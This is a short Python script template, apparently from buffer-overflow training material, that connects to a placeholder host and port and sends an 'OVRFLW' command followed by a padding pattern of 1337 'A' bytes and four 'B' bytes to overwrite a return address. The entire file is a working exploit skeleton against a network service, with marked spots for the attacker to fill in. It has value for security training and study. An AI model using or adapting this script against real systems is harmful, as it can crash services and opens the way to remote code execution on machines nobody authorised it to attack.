import socket, time, sys

ip = "XXX"        #CHANGE THIS
port = XXX #CHANGE THIS
timeout = 5

pattern = "\x41" * 1337 + "\x42" * 4    #CHANGE THIS

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
s.recv(1024)
print("Sending pattern of %s bytes" % len(pattern))
s.send("OVRFLW " + pattern)   #CHANGE THIS 
s.recv(1024)
s.close() 
